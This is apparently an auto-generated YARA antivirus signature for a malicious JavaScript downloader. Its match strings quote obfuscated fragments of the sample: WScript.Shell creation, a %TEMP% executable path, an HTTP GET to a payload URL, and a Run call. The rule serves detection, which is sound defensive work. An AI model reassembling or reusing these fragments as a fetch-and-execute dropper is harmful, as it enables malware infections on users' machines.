rule sig_20160328_418c03f51bae384b6bbf6bad699628f2 {
  meta:
    description = "datamaliciousorder - file 20160328_418c03f51bae384b6bbf6bad699628f2.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "40dccfbe910e1a0e7340845a407a96f7f0f24fc2bcd83c34dd0ab0d64ace4c21"

  strings:
    $s1  = "function Adstuosfvr() {return Zufbcuxlm[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"KT3N2KrBjDl4qKG.exe\";};" fullword ascii
    $s2  = "Mvwje[Yewpfb](\"GET\", \"http://gydkym.com/dk3s8sja\", false);" fullword ascii
    $s3  = "do {WScript[Tcudbf](Haqpgi() * 11)} while (Mvwje[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Zufbcuxlm = function Ktdhphrjjd() {return WScript[Kksadwofk](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Qiusya(Eekflixc, Wafzqdxim){return Eekflixc - Wafzqdxim;};" fullword ascii
    $s6  = "function Wxtkv() {return ((Chyreg == true) && (Chyreg == Pbiht)) ? 1 : Sckcrvwto;};" fullword ascii
    $s7  = "function Syjaml(Mrmea){Zufbcuxlm[\"Run\"](Mrmea, Sckcrvwto, Sckcrvwto);};" fullword ascii
    $s8  = "function Tyazcmtorm()" fullword ascii
    $s9  = "function Haqpgi(){return 22;};" fullword ascii
    $s10 = "var Pbiht = false;" fullword ascii
    $s11 = "return Qiusya(Lvsuc, Iojtp);" fullword ascii
    $s12 = "var Chyreg = false;" fullword ascii
    $s13 = "Pbiht = true; " fullword ascii
    $s14 = "function Nuumin(){return Kksadwofk;};" fullword ascii
    $s15 = "var Kyobjpvl = new this[\"Date\"]();" fullword ascii
    $s16 = " while (Dncbhsa){" fullword ascii
    $s17 = "Chyreg = true; " fullword ascii
    $s18 = "var Nilzjnce = false;" fullword ascii
    $s19 = "function Dlweka(Axuewmsm) {var Opnyohpjaz = (1, 2, 3, 4, 5, Axuewmsm); return Opnyohpjaz;};" fullword ascii
    $s20 = "function Wsfikynd(){return Dlnkrca;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}